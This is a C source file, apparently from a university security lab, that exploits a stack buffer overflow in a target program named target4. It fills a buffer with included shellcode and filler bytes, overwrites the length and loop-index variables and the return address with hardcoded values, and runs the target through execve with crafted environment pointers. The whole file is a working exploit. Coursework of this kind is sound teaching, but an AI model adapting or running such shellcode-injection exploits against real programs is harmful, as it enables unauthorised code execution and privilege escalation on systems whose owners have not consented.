#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"
#define hacking_memory "\xB0\xfd\x21\x20\x00" // memory of buffer in foo()
#define shell_size 45 // not 46
#define buffer_len 189 //foo return address - buffer address + 4 (for rp) + 1 (null character)
#define new_len "\xBB\x00\x00\x00\x00"// length = 188
#define new_i "\xAC\x00\x00\x00\x00"// i = 175

int main(void)
{
  char *args[3];
  char *env[6];

  

	char hack_buffer[buffer_len];

	int i; // inputting shellcode in first 46 bytes
	for (i=0; i< shell_size; i++){
		hack_buffer[i] = shellcode[i];
	}

	for (i=45; i< buffer_len; i++){ // inputting junk for the rest of the buffer that is not null
		hack_buffer[i] = 0x03; 
	}



	memcpy(&hack_buffer[184], hacking_memory, 4);

	memcpy(&hack_buffer[168], new_len, 4);

	memcpy(&hack_buffer[172], new_i, 4);
  

	hack_buffer[buffer_len - 1] = '\0'; //null character

  args[0] = TARGET; args[1] = hack_buffer; args[2] = NULL;
  
  env[0] = &hack_buffer[170];
  env[1] = &hack_buffer[171];
  env[2] = &hack_buffer[172];
  env[3] = &hack_buffer[174];
  env[4] = &hack_buffer[175];
  env[5] = &hack_buffer[176];


  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
